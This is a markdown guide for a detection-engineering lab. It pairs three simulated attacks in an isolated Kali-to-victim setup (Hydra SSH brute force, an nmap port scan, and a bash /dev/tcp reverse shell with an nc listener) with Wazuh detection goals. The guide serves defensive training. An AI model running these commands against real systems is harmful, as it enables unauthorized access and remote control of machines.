# Attack Scenarios

Three scenarios, ordered easy → harder. Each one should end with: an alert in Wazuh, a custom detection rule (if the default didn't catch it), and a filled-out incident report.

All commands below are run **from the Kali attacker VM against the victim VM only**, inside the isolated lab network.

---

## Scenario 1 — SSH Brute Force

**MITRE ATT&CK:** T1110 — Brute Force

**Simulate it:**
```bash
# Using Hydra against the victim's SSH service
hydra -l testuser -P /usr/share/wordlists/rockyou.txt ssh://<victim-ip>
```

**What to detect:**
- Multiple failed authentication attempts from a single source IP in a short window
- Wazuh's default ruleset already has SSH brute-force detection (rule group `authentication_failures`) — confirm it fires, then try tuning the threshold

**What "good detection" looks like:**
- Alert fires after N failed attempts (you choose N, document why)
- Alert includes source IP, target account, timestamp

---

## Scenario 2 — Network / Port Scanning

**MITRE ATT&CK:** T1046 — Network Service Scanning

**Simulate it:**
```bash
nmap -sS -sV -p- <victim-ip>
```

**What to detect:**
- A burst of connection attempts across many ports from one source in a short time
- This usually requires a **custom rule** — Wazuh doesn't always catch this out of the box without additional log sources (consider enabling `netstat`/connection logging or a lightweight IDS like Suricata feeding into Wazuh)

**What "good detection" looks like:**
- Alert on port-scan pattern (e.g., >20 distinct ports touched by one IP within 60 seconds)

---

## Scenario 3 — Reverse Shell / Command & Control

**MITRE ATT&CK:** T1059 — Command and Scripting Interpreter, T1071 — Application Layer Protocol (C2)

**Simulate it (lab-only, documented, not evasive):**
```bash
# On attacker: start a listener
nc -lvnp 4444

# On victim: simulate a compromised process reaching out
# (run manually on the victim VM to represent "malware execution")
bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
```

**What to detect:**
- Outbound connection from victim to an unexpected external IP/port
- Unusual child process of a shell (`bash` spawning a network connection)
- If using Sysmon (Windows) or `auditd` (Linux), look for process creation + network connection correlation

**What "good detection" looks like:**
- Alert correlates the process execution with the outbound connection, not just one or the other

---

## Stretch Goals (optional, once the three above work)

- Add a simulated **web attack** (SQLi or XSS against a deliberately vulnerable app like DVWA) and detect it via Wazuh's web log monitoring
- Add **Suricata** as a network IDS feeding into Wazuh for richer network-layer detection
- Chain scenarios together into a mini "attack narrative" (recon → brute force → shell) and write one incident report covering the full chain, like a real analyst would triage a multi-stage intrusion
